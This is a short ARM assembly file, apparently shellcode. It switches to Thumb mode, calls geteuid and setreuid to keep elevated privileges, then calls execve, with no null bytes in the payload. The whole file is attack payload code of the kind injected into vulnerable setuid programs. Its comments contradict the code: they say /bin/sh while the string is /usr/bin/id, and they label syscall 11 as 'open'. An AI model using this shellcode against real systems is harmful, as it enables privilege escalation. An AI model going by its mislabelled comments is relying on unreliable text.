.section .text
.global _start

_start:

@ enter thumbmode
.code 32
add r6, pc, #1
bx r6

.code 16
@ uid_t geteuid(void)
@ r7: 49

mov r7, #49		@ syscall number 49 (geteuid)
svc 1			@ execute syscall (no null bytes)

@ int setreuid(uid_t ruid, uid_t euid)
mov r1, r0
mov r7, #70		@ syscall number 70 (setreuid)
svc 1

@ execve(const char *filename, char *const argv[],char *const envp[]);
@ r0: //bin/sh
@ r1: //bin/sh
@ r2: 0
sub r2,r2,r2
mov r0, pc
add r0, #8    		@ 2 * rivimäärä ennen .ascii osiota
str r0, [sp, #4]
add r1, sp, #4
mov r7, #11      	@ open
svc 1

.ascii "/usr/bin/id"
